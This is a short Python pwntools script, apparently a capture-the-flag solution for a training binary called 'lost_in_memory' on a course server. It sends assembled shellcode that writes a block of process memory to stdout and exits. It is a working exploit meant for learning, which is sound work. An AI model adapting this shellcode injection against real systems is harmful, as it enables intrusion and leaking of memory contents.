from pwn import *

context.update(arch='amd64', os='linux')
context.terminal=['tmux','splitw','-h']

if "REMOTE" in args:

    p=remote("bin.training.offdef.it", 4001)

else:
    p=process("./lost_in_memory")
    gdb.attach(p,"""
    #b* 0x00100a20
            """)

input("wait")


asm_write = """
xor rax, rax
xor rdi, rdi
xor rdx, rdx
lea rsi, [rip-0x77]
mov rax, 0x1          # write
mov rdi, 1            #rdi=1 stdout
mov rdx, 0x30
syscall
mov rax,0x3c           #exit
mov rdi,0x0
syscall
"""

stage = asm(asm_write)

p.send(stage)

p.interactive()

